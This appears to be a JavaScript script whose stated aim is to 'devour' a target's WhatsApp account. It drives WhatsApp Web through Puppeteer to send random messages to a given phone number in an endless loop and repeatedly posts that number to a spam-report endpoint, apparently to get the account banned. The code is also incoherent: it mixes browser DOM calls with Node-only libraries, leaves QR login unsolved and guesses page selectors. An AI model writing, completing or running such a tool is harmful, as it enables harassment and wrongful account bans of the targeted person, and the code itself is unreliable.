// Import required libraries
const puppeteer = require('puppeteer');
const axios = require('axios');

// Get the input fields and buttons
const phoneInput = document.getElementById('phone');
const devourBtn = document.getElementById('devourBtn');
const messagesDiv = document.getElementById('messages');

// Add event listener to the devour button
devourBtn.addEventListener('click', devourAccount);

// Function to devour a WhatsApp account
async function devourAccount() {
  const phone = phoneInput.value;

  // Launch a new browser instance
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Go to WhatsApp Web
  await page.goto('https://web.whatsapp.com/');

  // Wait for the QR code to appear
  await page.waitForSelector('canvas');

  // Scan the QR code using an existing WhatsApp account
  // You'll need to find a way to automate this part or have someone scan the code manually

  // Loop infinitely to spam the target's WhatsApp
  while (true) {
    // Enter the target's phone number
    await page.type('input[placeholder="Phone number, contact name, or message"]', phone);

    // Type a random message
    const message = generateRandomMessage();
    await page.type('div[role="textbox"]', message);

    // Send the message
    await page.click('button[data-icon="send"]');

    // Delay for a short while before sending the next message
    await new Promise(resolve => setTimeout(resolve, 500));

    // Use Axios to report the target's phone number as spam
    axios.post('/report_spam', {
      phone: phone
    })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.error(error);
    });
  }

  // Close the browser
  await browser.close();
}

// Function to generate random messages
function generateRandomMessage() {
  const words = ['hello', 'world', 'this', 'is', 'a', 'test'];
  let message = '';

  for (let i = 0; i < 20; i++) {
    message += words[Math.floor(Math.random() * words.length)] + ' ';
  }

  return message;
}
